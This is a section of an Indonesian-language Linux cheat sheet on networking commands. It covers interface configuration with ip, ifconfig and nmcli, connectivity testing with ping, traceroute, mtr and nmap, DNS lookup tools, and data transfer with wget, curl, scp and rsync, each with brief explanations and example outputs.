# Bagian 6: Perintah Jaringan (Network)

---

## 6.1 Informasi & Konfigurasi Interface Jaringan

### `ip` - Show/Manipulate Network Settings
```bash
ip [opsi] <objek> <perintah>
```
> Perintah utama untuk manajemen jaringan di Linux modern

---

#### ip addr - Manajemen Alamat IP

| Perintah | Penjelasan |
|---|---|
| `ip addr` | Tampilkan semua interface dan IP address |
| `ip addr show` | Sama dengan ip addr |
| `ip addr show eth0` | Tampilkan info interface eth0 |
| `ip addr show up` | Tampilkan hanya interface yang aktif |
| `ip -4 addr show` | Tampilkan hanya IPv4 |
| `ip -6 addr show` | Tampilkan hanya IPv6 |
| `sudo ip addr add 192.168.1.100/24 dev eth0` | Tambah IP address |
| `sudo ip addr del 192.168.1.100/24 dev eth0` | Hapus IP address |
| `sudo ip addr flush dev eth0` | Hapus semua IP dari interface |
| `ip addr show \| grep "inet "` | Tampilkan hanya baris IPv4 |

**Contoh Output:**
```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
    link/ether 00:11:22:33:44:55 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0
    inet6 fe80::211:22ff:fe33:4455/64 scope link
```

---

#### ip link - Manajemen Interface

| Perintah | Penjelasan |
|---|---|
| `ip link show` | Tampilkan semua interface |
| `ip link show eth0` | Info interface tertentu |
| `ip -s link show eth0` | Statistik interface |
| `sudo ip link set eth0 up` | Aktifkan interface |
| `sudo ip link set eth0 down` | Nonaktifkan interface |
| `sudo ip link set eth0 mtu 9000` | Set MTU |
| `sudo ip link set eth0 address 00:11:22:33:44:55` | Set MAC address |
| `sudo ip link set eth0 promisc on` | Aktifkan promiscuous mode |
| `sudo ip link set eth0 promisc off` | Nonaktifkan promiscuous mode |
| `sudo ip link set eth0 txqueuelen 1000` | Set transmit queue length |
| `sudo ip link add veth0 type veth peer name veth1` | Buat virtual ethernet pair |
| `sudo ip link add br0 type bridge` | Buat bridge interface |
| `sudo ip link add dummy0 type dummy` | Buat dummy interface |
| `sudo ip link delete br0` | Hapus interface |
| `sudo ip link set eth0 master br0` | Tambah interface ke bridge |
| `sudo ip link set eth0 nomaster` | Lepas dari bridge |

---

#### ip route - Manajemen Routing

| Perintah | Penjelasan |
|---|---|
| `ip route` | Tampilkan tabel routing |
| `ip route show` | Sama dengan ip route |
| `ip route show table all` | Tampilkan semua tabel routing |
| `ip route get 8.8.8.8` | Tampilkan route ke IP tertentu |
| `sudo ip route add default via 192.168.1.1` | Tambah default gateway |
| `sudo ip route add 10.0.0.0/8 via 192.168.1.1` | Tambah static route |
| `sudo ip route add 10.0.0.0/8 dev eth0` | Route via interface |
| `sudo ip route del default` | Hapus default route |
| `sudo ip route del 10.0.0.0/8` | Hapus route tertentu |
| `sudo ip route replace default via 192.168.1.1` | Ganti route |
| `sudo ip route flush cache` | Flush routing cache |
| `sudo ip route flush table main` | Flush tabel routing utama |
| `ip route show dev eth0` | Route via interface tertentu |

---

#### ip neigh - ARP/Neighbor Table

| Perintah | Penjelasan |
|---|---|
| `ip neigh` | Tampilkan tabel ARP |
| `ip neigh show` | Sama dengan ip neigh |
| `ip neigh show dev eth0` | ARP table interface tertentu |
| `sudo ip neigh add 192.168.1.100 lladdr 00:11:22:33:44:55 dev eth0` | Tambah ARP entry |
| `sudo ip neigh del 192.168.1.100 dev eth0` | Hapus ARP entry |
| `sudo ip neigh flush dev eth0` | Flush ARP table |
| `sudo ip neigh flush all` | Flush semua ARP |

---

#### ip tunnel - Manajemen Tunnel

```bash
sudo ip tunnel add tun0 mode ipip remote 1.2.3.4 local 5.6.7.8
sudo ip tunnel add gre0 mode gre remote 1.2.3.4 local 5.6.7.8
sudo ip tunnel del tun0
ip tunnel show
```

---

### `ifconfig` - Interface Configuration (Legacy)
```bash
ifconfig [interface] [opsi]
```
> Perintah lama untuk konfigurasi interface (masih banyak digunakan)

> 📦 Perlu instalasi: `sudo apt install net-tools`

| Perintah | Penjelasan |
|---|---|
| `ifconfig` | Tampilkan interface yang aktif |
| `ifconfig -a` | Tampilkan semua interface |
| `ifconfig eth0` | Info interface eth0 |
| `sudo ifconfig eth0 up` | Aktifkan interface |
| `sudo ifconfig eth0 down` | Nonaktifkan interface |
| `sudo ifconfig eth0 192.168.1.100` | Set IP address |
| `sudo ifconfig eth0 192.168.1.100 netmask 255.255.255.0` | Set IP + netmask |
| `sudo ifconfig eth0 192.168.1.100/24` | Set IP dengan CIDR |
| `sudo ifconfig eth0 mtu 1500` | Set MTU |
| `sudo ifconfig eth0 hw ether 00:11:22:33:44:55` | Set MAC address |
| `sudo ifconfig eth0 promisc` | Aktifkan promiscuous mode |
| `sudo ifconfig eth0 -promisc` | Nonaktifkan promiscuous mode |
| `sudo ifconfig eth0 broadcast 192.168.1.255` | Set broadcast address |

---

### `hostname` - Show/Set Hostname
```bash
hostname [opsi] [nama_baru]
```
> Menampilkan atau mengubah hostname sistem

| Perintah | Penjelasan |
|---|---|
| `hostname` | Tampilkan hostname saat ini |
| `hostname -f` | Tampilkan FQDN (Fully Qualified Domain Name) |
| `hostname -i` | Tampilkan IP address hostname |
| `hostname -I` | Tampilkan semua IP address |
| `hostname -s` | Tampilkan short hostname |
| `hostname -d` | Tampilkan domain name |
| `sudo hostname baru-hostname` | Set hostname sementara |
| `sudo hostnamectl set-hostname baru-hostname` | Set hostname permanen |
| `hostnamectl` | Info hostname lengkap |
| `hostnamectl status` | Status hostname |

---

### `hostnamectl` - Control System Hostname
```bash
hostnamectl [opsi] <perintah>
```
> Manajemen hostname sistem menggunakan systemd

| Perintah | Penjelasan |
|---|---|
| `hostnamectl` | Tampilkan info hostname |
| `hostnamectl status` | Status hostname |
| `sudo hostnamectl set-hostname nama-baru` | Set hostname statis |
| `sudo hostnamectl set-hostname nama-baru --pretty` | Set pretty hostname |
| `sudo hostnamectl set-hostname nama-baru --transient` | Set hostname sementara |
| `sudo hostnamectl set-chassis server` | Set tipe chassis |
| `sudo hostnamectl set-location "Data Center 1"` | Set lokasi |
| `sudo hostnamectl set-deployment production` | Set environment deployment |

---

### `nmcli` - NetworkManager CLI
```bash
nmcli [opsi] <objek> <perintah>
```
> CLI untuk NetworkManager (manajemen jaringan modern)

**Informasi:**
| Perintah | Penjelasan |
|---|---|
| `nmcli` | Tampilkan status jaringan ringkas |
| `nmcli general status` | Status umum NetworkManager |
| `nmcli general hostname` | Tampilkan hostname |
| `nmcli device` | Daftar semua device |
| `nmcli device status` | Status semua device |
| `nmcli device show` | Info detail semua device |
| `nmcli device show eth0` | Info detail device tertentu |
| `nmcli connection` | Daftar semua koneksi |
| `nmcli connection show` | Detail semua koneksi |
| `nmcli connection show "Nama Koneksi"` | Detail koneksi tertentu |
| `nmcli -p device` | Output lebih rapi (pretty) |
| `nmcli -f all device` | Tampilkan semua field |

**Manajemen Koneksi:**
| Perintah | Penjelasan |
|---|---|
| `sudo nmcli connection up "Nama Koneksi"` | Aktifkan koneksi |
| `sudo nmcli connection down "Nama Koneksi"` | Nonaktifkan koneksi |
| `sudo nmcli connection delete "Nama Koneksi"` | Hapus koneksi |
| `sudo nmcli connection reload` | Reload semua koneksi |
| `sudo nmcli connection import type openvpn file config.ovpn` | Import VPN |

**Membuat Koneksi Baru:**
```bash
# Koneksi Ethernet dengan IP statis
sudo nmcli connection add type ethernet \
  con-name "Static-ETH" \
  ifname eth0 \
  ipv4.addresses 192.168.1.100/24 \
  ipv4.gateway 192.168.1.1 \
  ipv4.dns "8.8.8.8,8.8.4.4" \
  ipv4.method manual

# Koneksi Ethernet DHCP
sudo nmcli connection add type ethernet \
  con-name "DHCP-ETH" \
  ifname eth0 \
  ipv4.method auto

# Koneksi WiFi
sudo nmcli device wifi connect "SSID" password "password"
sudo nmcli connection add type wifi \
  con-name "WiFi-Home" \
  ifname wlan0 \
  ssid "NamaSSID" \
  wifi-sec.key-mgmt wpa-psk \
  wifi-sec.psk "password"

# Tambah DNS
sudo nmcli connection modify "Nama" ipv4.dns "8.8.8.8"

# Tambah IP tambahan
sudo nmcli connection modify "Nama" +ipv4.addresses "192.168.1.101/24"

# Set VLAN
sudo nmcli connection add type vlan \
  con-name "VLAN10" \
  ifname eth0.10 \
  dev eth0 id 10
```

**WiFi:**
| Perintah | Penjelasan |
|---|---|
| `nmcli device wifi list` | Scan dan tampilkan WiFi |
| `nmcli device wifi rescan` | Scan ulang WiFi |
| `sudo nmcli device wifi connect "SSID" password "pass"` | Connect ke WiFi |
| `sudo nmcli device disconnect wlan0` | Disconnect WiFi |
| `nmcli device wifi show-password` | Tampilkan password WiFi aktif |

---

### `nmtui` - NetworkManager Text UI
```bash
nmtui
```
> Antarmuka teks interaktif untuk NetworkManager

```bash
nmtui                    # Buka TUI NetworkManager
nmtui edit               # Edit koneksi
nmtui connect            # Connect/disconnect
nmtui hostname           # Set hostname
```

---

## 6.2 Pengujian Konektivitas

### `ping` - Test Network Connectivity
```bash
ping [opsi] <host>
```
> Menguji konektivitas jaringan ke host

| Perintah | Penjelasan |
|---|---|
| `ping google.com` | Ping terus menerus |
| `ping -c 4 google.com` | Ping 4 kali |
| `ping -c 4 -i 2 google.com` | Ping 4 kali, interval 2 detik |
| `ping -t 64 google.com` | Set TTL |
| `ping -s 1000 google.com` | Set ukuran paket (bytes) |
| `ping -W 2 google.com` | Timeout 2 detik per ping |
| `ping -w 10 google.com` | Total timeout 10 detik |
| `ping -f google.com` | Flood ping (perlu root) |
| `ping -q google.com` | Quiet mode (hanya statistik) |
| `ping -v google.com` | Verbose |
| `ping -I eth0 google.com` | Ping via interface tertentu |
| `ping -I 192.168.1.100 google.com` | Ping dari IP tertentu |
| `ping -4 google.com` | Gunakan IPv4 |
| `ping -6 google.com` | Gunakan IPv6 |
| `ping6 google.com` | Ping IPv6 |
| `ping -a google.com` | Audible ping (bunyi) |
| `ping -D google.com` | Tampilkan timestamp |
| `ping -n google.com` | Jangan resolve hostname |
| `ping -b 192.168.1.255` | Broadcast ping |
| `ping -M do google.com` | Jangan fragment (Path MTU discovery) |

**Contoh Output:**
```
PING google.com (142.250.4.100) 56(84) bytes of data.
64 bytes from 142.250.4.100: icmp_seq=1 ttl=117 time=15.2 ms
64 bytes from 142.250.4.100: icmp_seq=2 ttl=117 time=14.8 ms

--- google.com ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 14.8/15.0/15.2/0.200 ms
```

---

### `ping6` - Test IPv6 Connectivity
```bash
ping6 [opsi] <host>
```
> Menguji konektivitas IPv6

```bash
ping6 ::1                      # Ping loopback IPv6
ping6 -c 4 ipv6.google.com     # Ping IPv6 ke Google
ping6 -I eth0 fe80::1          # Ping link-local via interface
```

---

### `traceroute` - Trace Network Path
```bash
traceroute [opsi] <host>
```
> Menampilkan jalur paket menuju host tujuan

> 📦 Perlu instalasi: `sudo apt install traceroute`

| Perintah | Penjelasan |
|---|---|
| `traceroute google.com` | Trace jalur ke google.com |
| `traceroute -n google.com` | Tanpa resolve hostname |
| `traceroute -m 20 google.com` | Maksimal 20 hop |
| `traceroute -w 3 google.com` | Timeout 3 detik per hop |
| `traceroute -q 1 google.com` | Hanya 1 probe per hop |
| `traceroute -I google.com` | Gunakan ICMP |
| `traceroute -T google.com` | Gunakan TCP |
| `traceroute -U google.com` | Gunakan UDP (default) |
| `traceroute -p 80 google.com` | Gunakan port tertentu |
| `traceroute -s 192.168.1.100 google.com` | Dari IP tertentu |
| `traceroute -i eth0 google.com` | Via interface tertentu |
| `traceroute -4 google.com` | IPv4 |
| `traceroute -6 google.com` | IPv6 |
| `traceroute6 google.com` | Trace IPv6 |

---

### `tracepath` - Trace Network Path (No Root)
```bash
tracepath [opsi] <host>
```
> Seperti traceroute tapi tidak perlu hak root

```bash
tracepath google.com
tracepath -n google.com      # Tanpa resolve hostname
tracepath -b google.com      # Tampilkan IP dan hostname
tracepath -m 20 google.com   # Maksimal 20 hop
tracepath6 google.com        # IPv6
```

---

### `mtr` - My Traceroute (Combined ping + traceroute)
```bash
mtr [opsi] <host>
```
> Kombinasi ping dan traceroute secara real-time

> 📦 Perlu instalasi: `sudo apt install mtr`

| Perintah | Penjelasan |
|---|---|
| `mtr google.com` | Jalankan mtr interaktif |
| `mtr -n google.com` | Tanpa resolve hostname |
| `mtr -c 10 google.com` | Kirim 10 paket lalu selesai |
| `mtr --report google.com` | Mode report (tidak interaktif) |
| `mtr --report -n google.com` | Report tanpa DNS |
| `mtr -r -c 100 google.com` | Report 100 paket |
| `mtr --tcp google.com` | Gunakan TCP |
| `mtr --udp google.com` | Gunakan UDP |
| `mtr -P 80 google.com` | Gunakan port tertentu |
| `mtr -i 0.5 google.com` | Interval 0.5 detik |
| `mtr -m 30 google.com` | Maksimal 30 hop |
| `mtr --no-dns google.com` | Nonaktifkan DNS lookup |
| `mtr -4 google.com` | IPv4 |
| `mtr -6 google.com` | IPv6 |
| `mtr -o "LASDBRS" google.com` | Pilih kolom yang ditampilkan |
| `mtr --json google.com` | Output JSON |
| `mtr --xml google.com` | Output XML |
| `mtr --csv google.com` | Output CSV |

---

### `arping` - ARP Ping
```bash
arping [opsi] <host>
```
> Ping menggunakan ARP request

> 📦 Perlu instalasi: `sudo apt install arping`

```bash
sudo arping 192.168.1.1          # ARP ping ke gateway
sudo arping -c 4 192.168.1.1    # 4 kali
sudo arping -I eth0 192.168.1.1 # Via interface tertentu
sudo arping -D 192.168.1.100    # Deteksi IP duplikat
sudo arping -f 192.168.1.1      # Stop setelah reply pertama
```

---

### `nmap` - Network Scanner
```bash
nmap [opsi] <target>
```
> Scanner jaringan yang sangat powerful

> 📦 Perlu instalasi: `sudo apt install nmap`

**Scan Dasar:**
| Perintah | Penjelasan |
|---|---|
| `nmap 192.168.1.1` | Scan satu host |
| `nmap 192.168.1.0/24` | Scan seluruh subnet |
| `nmap 192.168.1.1-100` | Scan range IP |
| `nmap 192.168.1.1 192.168.1.2` | Scan beberapa host |
| `nmap google.com` | Scan dari hostname |
| `nmap -iL hosts.txt` | Scan dari file daftar host |
| `nmap -iR 10` | Scan 10 host acak |
| `nmap --exclude 192.168.1.1` | Kecualikan IP tertentu |

**Scan Port:**
| Perintah | Penjelasan |
|---|---|
| `nmap -p 80 192.168.1.1` | Scan port 80 |
| `nmap -p 80,443 192.168.1.1` | Scan port 80 dan 443 |
| `nmap -p 1-1000 192.168.1.1` | Scan port 1-1000 |
| `nmap -p- 192.168.1.1` | Scan semua port (1-65535) |
| `nmap -F 192.168.1.1` | Fast scan (100 port paling umum) |
| `nmap --top-ports 1000 192.168.1.1` | 1000 port paling umum |
| `nmap -p http,https 192.168.1.1` | Scan berdasarkan nama service |

**Tipe Scan:**
| Perintah | Penjelasan |
|---|---|
| `nmap -sS 192.168.1.1` | SYN scan (stealth, default) |
| `nmap -sT 192.168.1.1` | TCP connect scan |
| `nmap -sU 192.168.1.1` | UDP scan |
| `nmap -sA 192.168.1.1` | ACK scan |
| `nmap -sN 192.168.1.1` | Null scan |
| `nmap -sF 192.168.1.1` | FIN scan |
| `nmap -sX 192.168.1.1` | Xmas scan |
| `nmap -sP 192.168.1.0/24` | Ping scan (host discovery) |
| `nmap -sn 192.168.1.0/24` | No port scan (host discovery) |
| `nmap -Pn 192.168.1.1` | Skip host discovery |
| `nmap -sV 192.168.1.1` | Deteksi versi service |
| `nmap -O 192.168.1.1` | Deteksi OS |
| `nmap -A 192.168.1.1` | Aggressive: OS + version + script + traceroute |

**Script & Advanced:**
| Perintah | Penjelasan |
|---|---|
| `nmap -sC 192.168.1.1` | Jalankan default scripts |
| `nmap --script=http-title 192.168.1.1` | Jalankan script tertentu |
| `nmap --script=vuln 192.168.1.1` | Scan kerentanan |
| `nmap --script=http-headers 192.168.1.1` | Ambil HTTP headers |
| `nmap --script=smb-vuln* 192.168.1.1` | Scan kerentanan SMB |
| `nmap --script-help http-title` | Bantuan script |

**Output:**
| Perintah | Penjelasan |
|---|---|
| `nmap -oN output.txt 192.168.1.1` | Output normal ke file |
| `nmap -oX output.xml 192.168.1.1` | Output XML |
| `nmap -oG output.gnmap 192.168.1.1` | Output grepable |
| `nmap -oA output 192.168.1.1` | Semua format output |
| `nmap -v 192.168.1.1` | Verbose |
| `nmap -d 192.168.1.1` | Debug |
| `nmap --reason 192.168.1.1` | Tampilkan alasan status port |
| `nmap --open 192.168.1.1` | Tampilkan hanya port terbuka |

---

## 6.3 DNS & Name Resolution

### `nslookup` - Query DNS
```bash
nslookup [opsi] <host> [server]
```
> Query informasi DNS

| Perintah | Penjelasan |
|---|---|
| `nslookup google.com` | Query DNS default |
| `nslookup google.com 8.8.8.8` | Query ke DNS server tertentu |
| `nslookup -type=A google.com` | Query record A (IPv4) |
| `nslookup -type=AAAA google.com` | Query record AAAA (IPv6) |
| `nslookup -type=MX google.com` | Query record MX (mail) |
| `nslookup -type=NS google.com` | Query record NS (nameserver) |
| `nslookup -type=TXT google.com` | Query record TXT |
| `nslookup -type=CNAME google.com` | Query record CNAME |
| `nslookup -type=SOA google.com` | Query record SOA |
| `nslookup -type=PTR 8.8.8.8` | Reverse lookup (IP ke hostname) |
| `nslookup -type=ANY google.com` | Semua record |
| `nslookup -debug google.com` | Mode debug |
| `nslookup -timeout=5 google.com` | Timeout 5 detik |
| `nslookup -retry=2 google.com` | 2 kali retry |

---

### `dig` - DNS Lookup Utility
```bash
dig [opsi] <host> [tipe_record]
```
> Query DNS yang lebih detail dan fleksibel

| Perintah | Penjelasan |
|---|---|
| `dig google.com` | Query DNS default (A record) |
| `dig google.com A` | Query A record |
| `dig google.com AAAA` | Query AAAA record |
| `dig google.com MX` | Query MX record |
| `dig google.com NS` | Query NS record |
| `dig google.com TXT` | Query TXT record |
| `dig google.com CNAME` | Query CNAME record |
| `dig google.com SOA` | Query SOA record |
| `dig google.com ANY` | Semua record |
| `dig -x 8.8.8.8` | Reverse lookup |
| `dig @8.8.8.8 google.com` | Query ke DNS server tertentu |
| `dig @1.1.1.1 google.com MX` | Query MX ke Cloudflare DNS |
| `dig +short google.com` | Output singkat (hanya jawaban) |
| `dig +noall +answer google.com` | Hanya bagian answer |
| `dig +trace google.com` | Trace DNS resolution |
| `dig +nssearch google.com` | Cari SOA & nameserver |
| `dig +multiline google.com` | Format multi-baris |
| `dig +nocomments google.com` | Tanpa komentar |
| `dig +stats google.com` | Tampilkan statistik query |
| `dig +tcp google.com` | Gunakan TCP |
| `dig -p 5353 google.com` | Query ke port tertentu |
| `dig -f queries.txt` | Query dari file |
| `dig +dnssec google.com` | Tampilkan record DNSSEC |
| `dig google.com \| grep "Query time"` | Hanya waktu query |

**Contoh Output dig:**
```
; <<>> DiG 9.16.1 <<>> google.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;google.com.                    IN      A

;; ANSWER SECTION:
google.com.             299     IN      A       142.250.4.100

;; Query time: 15 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Jan 15 10:30:00 WIB 2024
;; MSG SIZE  rcvd: 55
```

---

### `host` - DNS Lookup
```bash
host [opsi] <host> [server]
```
> Query DNS yang lebih sederhana

| Perintah | Penjelasan |
|---|---|
| `host google.com` | Query DNS dasar |
| `host google.com 8.8.8.8` | Query ke server tertentu |
| `host -t A google.com` | Record A |
| `host -t MX google.com` | Record MX |
| `host -t NS google.com` | Record NS |
| `host -t TXT google.com` | Record TXT |
| `host -t ANY google.com` | Semua record |
| `host 8.8.8.8` | Reverse lookup |
| `host -a google.com` | Semua informasi |
| `host -v google.com` | Verbose |
| `host -l google.com` | Zone transfer (list) |
| `host -C google.com` | Cek konsistensi SOA |
| `host -R 3 google.com` | 3 kali retry |
| `host -W 5 google.com` | Timeout 5 detik |

---

### `resolvectl` / `systemd-resolve` - DNS Resolution
```bash
resolvectl [opsi] <perintah>
```
> Manajemen DNS menggunakan systemd-resolved

| Perintah | Penjelasan |
|---|---|
| `resolvectl status` | Status DNS resolver |
| `resolvectl query google.com` | Query DNS |
| `resolvectl query -t MX google.com` | Query tipe tertentu |
| `resolvectl dns` | Tampilkan DNS server yang digunakan |
| `resolvectl dns eth0 8.8.8.8` | Set DNS server untuk interface |
| `resolvectl domain` | Tampilkan domain search |
| `resolvectl flush-caches` | Flush DNS cache |
| `resolvectl statistics` | Statistik DNS |
| `resolvectl reset-statistics` | Reset statistik |
| `resolvectl monitor` | Monitor DNS request |

---

### `getent` - Get Entries from Databases
```bash
getent <database> [key]
```
> Mengambil entri dari database sistem (hosts, passwd, group, dll.)

| Perintah | Penjelasan |
|---|---|
| `getent hosts google.com` | Resolve hostname |
| `getent hosts 8.8.8.8` | Reverse lookup |
| `getent passwd username` | Info user |
| `getent group groupname` | Info grup |
| `getent ahosts google.com` | Semua alamat (IPv4 + IPv6) |
| `getent ahostsv4 google.com` | Hanya IPv4 |
| `getent ahostsv6 google.com` | Hanya IPv6 |
| `getent services 80` | Nama service dari port |
| `getent services http` | Port dari nama service |
| `getent networks` | Daftar jaringan |
| `getent protocols tcp` | Info protokol |

---

## 6.4 Transfer Data & Download

### `wget` - Non-interactive Network Downloader
```bash
wget [opsi] <URL>
```
> Mengunduh file dari web

| Perintah | Penjelasan |
|---|---|
| `wget https://url/file.txt` | Unduh file |
| `wget -O nama-file.txt https://url/file` | Simpan dengan nama tertentu |
| `wget -P /path/direktori/ https://url/file` | Simpan ke direktori tertentu |
| `wget -c https://url/file` | Lanjutkan unduhan yang terputus |
| `wget -b https://url/file` | Unduh di background |
| `wget -q https://url/file` | Quiet mode |
| `wget -v https://url/file` | Verbose |
| `wget --no-verbose https://url/file` | Minimal output |
| `wget -r https://url/` | Download rekursif |
| `wget -r -l 2 https://url/` | Rekursif dengan kedalaman 2 |
| `wget -m https://url/` | Mirror website |
| `wget -np https://url/` | No parent (jangan naik ke direktori induk) |
| `wget -nd https://url/` | No directories (simpan semua di folder saat ini) |
| `wget --accept "*.html,*.css" https://url/` | Unduh tipe file tertentu |
| `wget --reject "*.jpg,*.png" https://url/` | Abaikan tipe file tertentu |
| `wget -i urls.txt` | Unduh dari file daftar URL |
| `wget --limit-rate=1M https://url/file` | Batasi kecepatan unduh |
| `wget --wait=2 https://url/` | Tunggu 2 detik antar request |
| `wget --tries=5 https://url/file` | Maksimal 5 percobaan |
| `wget --timeout=30 https://url/file` | Timeout 30 detik |
| `wget --user=user --password=pass https://url/` | Autentikasi |
| `wget --no-check-certificate https://url/` | Abaikan SSL certificate |
| `wget --header="User-Agent: Mozilla/5.0" https://url/` | Custom header |
| `wget --post-data="key=value" https://url/` | HTTP POST |
| `wget --spider https://url/file` | Cek URL tanpa unduh |
| `wget --ftp-user=user --ftp-password=pass ftp://url/` | FTP download |
| `wget -e "https_proxy=http://proxy:8080" https://url/` | Via proxy |

---

### `curl` - Transfer Data with URLs
```bash
curl [opsi] <URL>
```
> Tool transfer data yang sangat fleksibel

**Download & Upload:**
| Perintah | Penjelasan |
|---|---|
| `curl https://url/file` | Tampilkan konten ke stdout |
| `curl -o file.txt https://url/file` | Simpan ke file |
| `curl -O https://url/file.txt` | Simpan dengan nama asli |
| `curl -L https://url/` | Ikuti redirect |
| `curl -C - https://url/file` | Lanjutkan unduhan |
| `curl --limit-rate 1M https://url/file` | Batasi kecepatan |
| `curl -# https://url/file` | Progress bar |
| `curl -s https://url/file` | Silent mode |
| `curl -v https://url/file` | Verbose (tampilkan headers) |
| `curl -I https://url/` | Hanya tampilkan headers (HEAD request) |

**HTTP Methods:**
| Perintah | Penjelasan |
|---|---|
| `curl -X GET https://api/endpoint` | HTTP GET |
| `curl -X POST https://api/endpoint` | HTTP POST |
| `curl -X PUT https://api/endpoint` | HTTP PUT |
| `curl -X DELETE https://api/endpoint` | HTTP DELETE |
| `curl -X PATCH https://api/endpoint` | HTTP PATCH |

**Data & Headers:**
| Perintah | Penjelasan |
|---|---|
| `curl -d "key=value" https://api/` | POST data |
| `curl -d '{"key":"value"}' https://api/` | POST JSON string |
| `curl -d @data.json https://api/` | POST dari file |
| `curl -F "file=@/path/file.txt" https://api/` | Upload file (multipart) |
| `curl -H "Content-Type: application/json" https://api/` | Custom header |
| `curl -H "Authorization: Bearer token" https://api/` | Auth header |
| `curl -H "Accept: application/json" https://api/` | Accept header |
| `curl -u user:password https://api/` | Basic auth |
| `curl --oauth2-bearer token https://api/` | OAuth2 |
| `curl -b "cookie=value" https://url/` | Kirim cookie |
| `curl -c cookies.txt https://url/` | Simpan cookie |
| `curl -b cookies.txt https://url/` | Gunakan cookie dari file |

**SSL & Keamanan:**
| Perintah | Penjelasan |
|---|---|
| `curl -k https://url/` | Abaikan SSL verification |
| `curl --cacert ca.crt https://url/` | Gunakan CA certificate |
| `curl --cert client.crt --key client.key https://url/` | Client certificate |
| `curl --ssl-no-revoke https://url/` | Jangan cek revokasi |

**Proxy & Network:**
| Perintah | Penjelasan |
|---|---|
| `curl -x http://proxy:8080 https://url/` | Via HTTP proxy |
| `curl --socks5 proxy:1080 https://url/` | Via SOCKS5 proxy |
| `curl --interface eth0 https://url/` | Via interface tertentu |
| `curl --resolve google.com:443:1.2.3.4 https://google.com/` | Override DNS |
| `curl --connect-to google.com::1.2.3.4: https://google.com/` | Connect ke IP lain |
| `curl -4 https://url/` | Gunakan IPv4 |
| `curl -6 https://url/` | Gunakan IPv6 |
| `curl --max-time 30 https://url/` | Timeout 30 detik |
| `curl --connect-timeout 10 https://url/` | Connection timeout |
| `curl --retry 3 https://url/` | 3 kali retry |

**Output & Format:**
| Perintah | Penjelasan |
|---|---|
| `curl -w "%{http_code}" https://url/` | Tampilkan HTTP status code |
| `curl -w "%{time_total}" https://url/` | Tampilkan waktu total |
| `curl -w "@format.txt" https://url/` | Format dari file |
| `curl -D headers.txt https://url/` | Simpan headers ke file |
| `curl --compressed https://url/` | Minta compressed response |

**Contoh REST API:**
```bash
# GET request dengan JSON header
curl -H "Content-Type: application/json" \
     -H "Authorization: Bearer TOKEN" \
     https://api.example.com/users

# POST JSON data
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"name":"John","email":"john@example.com"}' \
     https://api.example.com/users

# PUT dengan auth
curl -X PUT \
     -u admin:password \
     -H "Content-Type: application/json" \
     -d '{"name":"Jane"}' \
     https://api.example.com/users/1

# Upload file
curl -X POST \
     -F "file=@/path/to/file.pdf" \
     -F "description=My File" \
     https://api.example.com/upload
```

---

### `scp` - Secure Copy
```bash
scp [opsi] <sumber> <tujuan>
```
> Menyalin file melalui SSH secara aman

| Perintah | Penjelasan |
|---|---|
| `scp file.txt user@host:/path/` | Kirim file ke remote |
| `scp user@host:/path/file.txt .` | Ambil file dari remote |
| `scp file.txt user@host:~/` | Kirim ke home directory |
| `scp -r folder/ user@host:/path/` | Kirim direktori (rekursif) |
| `scp -P 2222 file.txt user@host:/path/` | Port SSH tertentu |
| `scp -i ~/.ssh/id_rsa file.txt user@host:/path/` | Gunakan key tertentu |
| `scp -C file.txt user@host:/path/` | Kompresi |
| `scp -l 1000 file.txt user@host:/path/` | Batasi bandwidth (Kbps) |
| `scp -v file.txt user@host:/path/` | Verbose |
| `scp -q file.txt user@host:/path/` | Quiet mode |
| `scp -p file.txt user@host:/path/` | Pertahankan timestamp & permission |
| `scp user1@host1:/path/ user2@host2:/path/` | Remote ke remote |
| `scp -o "StrictHostKeyChecking=no" file.txt user@host:/path/` | Skip host checking |
| `scp *.txt user@host:/path/` | Kirim banyak file |

---

### `rsync` - Remote File Sync
```bash
rsync [opsi] <sumber> <tujuan>
```
> Sinkronisasi file lokal maupun remote secara efisien

| Perintah | Penjelasan |
|---|---|
| `rsync -av sumber/ tujuan/` | Sinkronisasi lokal + verbose |
| `rsync -avz sumber/ user@host:/tujuan/` | Sinkronisasi ke remote + kompresi |
| `rsync -avz user@host:/sumber/ tujuan/` | Ambil dari remote |
| `rsync -av --delete sumber/ tujuan/` | Hapus file di tujuan yang tidak ada di sumber |
| `rsync -av --dry-run sumber/ tujuan/` | Simulasi tanpa benar-benar menyalin |
| `rsync -avP sumber/ tujuan/` | Tampilkan progress |
| `rsync -av --progress sumber/ tujuan/` | Progress detail |
| `rsync -av --exclude="*.log" sumber/ tujuan/` | Kecualikan file |
| `rsync -av --exclude={".git","node_modules"} sumber/ tujuan/` | Kecualikan beberapa |
| `rsync -av --include="*.txt" --exclude="*" sumber/ tujuan/` | Hanya .txt |
| `rsync -av --filter="merge filter.txt" sumber/ tujuan/` | Filter dari file |
| `rsync -e "ssh -p 2222" sumber/ user@host:/tujuan/` | Port SSH tertentu |
| `rsync -e "ssh -i ~/.ssh/key" sumber/ user@host:/tujuan/` | Key tertentu |
| `rsync --bwlimit=1000 sumber/ tujuan/` | Batasi bandwidth (KB/s) |
| `rsync -av --backup --backup-dir=/backup sumber/ tujuan/` | Backup file yang diganti |
| `rsync -av --suffix=.bak sumber/ tujuan/` | Suffix untuk backup |
| `rsync --checksum sumber/ tujuan/` | Bandingkan berdasarkan checksum |
| `rsync --ignore-existing sumber/ tujuan/` | Skip file yang sudah ada |
| `rsync --update sumber/ tujuan/` | Skip file yang lebih baru di tujuan |
| `rsync -av --chmod=644 sumber/ tujuan/` | Set permission file |
| `rsync -av --chown=user:group sumber/ tujuan/` | Set owner |
| `rsync -n sumber/ tujuan/` | Dry run (shorthand) |
